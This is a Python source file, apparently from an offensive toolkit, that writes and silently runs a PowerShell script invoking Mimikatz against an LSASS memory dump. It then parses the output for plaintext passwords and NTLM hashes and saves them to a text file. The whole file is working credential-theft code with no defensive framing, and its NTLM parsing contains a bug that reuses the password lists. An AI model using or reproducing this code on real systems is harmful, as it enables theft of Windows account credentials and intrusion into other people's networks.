import os
from SpearBruteForce import SpearBruteForce


class DumpWithMimi(object):
    
    def __init__(self,pathToMimikatz):
        self.pathmimi = pathToMimikatz
        

    def lsassDump(self,path):
        logFile = os.path.dirname(os.path.realpath(self.pathmimi)) + "\\mimilog.log"
        try:
            os.remove(logFile)
        except:
            pass
        comm = '$test = "sekurlsa::minidump `"'+path+'`"" ; Start-Process "'+self.pathmimi+'" -ArgumentList "`"log mimilog.log`"", "`"$test`"","sekurlsa::logonPasswords" -WindowStyle Hidden'    
        open("POWMIM.ps1",'w').write(comm)
        if len(SpearBruteForce().cmd("powershell .\\POWMIM.ps1"))==0:
            return self.__parseLsass__(open(logFile,'r').readlines())

    def __parseLsass__(self,lst):
        p,u,d,hn,hu,hd = [],[],[],[],[],[]
        pres = f'{"User-Name":<30}{"Domain":^40}{"Password":<90}\n'
        pres+='-'*82+'\n'
        presh = f'{"User-Name":<30}{"Domain":^40}{"NTLM":<90}\n'
        presh+='-'*82+'\n'
        for i in range(len(lst)):
            n = lst[i].strip()
            if "* Password" in n and "* Password : (null)" not in n:
                psw = n.split('* Password :')[-1].strip()
                usr = lst[i-2].strip().split('* Username :')[-1].strip()
                dmn = lst[i-1].strip().split('* Domain   :')[-1].strip()
                if psw not in p and usr not in u and dmn not in d:
                    p,u,d = p + [psw], u + [usr], d + [dmn]
                    pres+=(f"{usr:<30}{dmn:^40}{psw:<90}\n")
            if "* NTLM     :" in n:
                h = n.split('* NTLM     :')[-1].strip()
                usr = lst[i-2].strip().split('* Username :')[-1].strip()
                dmn = lst[i-1].strip().split('* Domain   :')[-1].strip()
                if h not in hn and usr not in hu and dmn not in hd:
                    hn,hu,hd = p + [h], u + [usr], d + [dmn]
                    presh+=(f"{usr:<30}{dmn:^40}{h:<90}\n")
        open("PARSELSASSDUMPPROJ.txt","w").write(pres+'\n'*3+presh)
        return os.startfile("PARSELSASSDUMPPROJ.txt")

